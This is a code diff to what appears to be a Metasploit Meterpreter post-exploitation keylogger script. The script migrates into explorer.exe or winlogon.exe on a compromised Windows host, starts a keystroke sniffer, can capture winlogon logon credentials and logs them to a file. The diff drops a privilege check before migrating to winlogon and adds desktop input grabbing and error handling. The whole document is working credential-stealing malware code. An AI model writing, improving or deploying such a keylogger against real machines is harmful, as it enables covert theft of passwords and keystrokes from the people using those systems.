@@ -34,21 +34,15 @@ captype = 0
   "-c"  => [ true,  "Type of key capture. (0) for user key presses or (1) for winlogon credential capture Default is 0."]
   
 )
+
 #Function to Migrate in to Explorer process to be able to interact with desktop
-def explrmigrate(session,captype)
+def explrmigrate(session,captype,adm)
 	begin
 		print_status("Migrating process...")
 		if captype.to_i == 0
 			process2mig = "explorer.exe"
 		elsif captype.to_i == 1
-			# Check to make sure that process is running and system to be able to migrate to high priv process
-			if (session.sys.config.getuid == "NT AUTHORITY\\SYSTEM")
-				process2mig = "winlogon.exe"
-			else
-				print_status("\tYou are not currently running as System to be able to migrate to winlogon.")
-				print_status("\tCapturing only logon user keystrokes.")
-				process2mig = "explorer.exe"
-			end
+			process2mig = "winlogon.exe"
 		else
 			process2mig = "explorer.exe"
 		end
@@ -70,8 +64,10 @@ end
 #Function for starting the keylogger
 def startkeylogger(session)
 	begin
+		print_status("Grabbing Desktop Keyboard Input...")
+		session.ui.grab_desktop
 		print_status("Starting the keystroke sniffer...") 
-		client.ui.keyscan_start
+		session.ui.keyscan_start
 		return true
 	rescue
 		print_status("Failed to start Keylogging!")
@@ -125,8 +121,11 @@ def keycap(session, keytime, logfile)
 		     end
 		   db.close
 	rescue::Exception => e
+    print("\n")
+		print_status("#{e.class} #{e}")
 		db.close
-		print_status("Error: #{e.class} #{e}")
+    print_status("Stopping keystroke sniffer...")
+		session.ui.keyscan_stop
 	end
 end
 def helpmsg
@@ -155,7 +154,8 @@ helpcall = 0
 
 }
 if helpcall == 0
-	if explrmigrate(session,captype)
+	adm = checkifadm(session)
+	if explrmigrate(session,captype,adm)
 		if startkeylogger(session)
 			keycap(session, keytime, logfile)
 		end
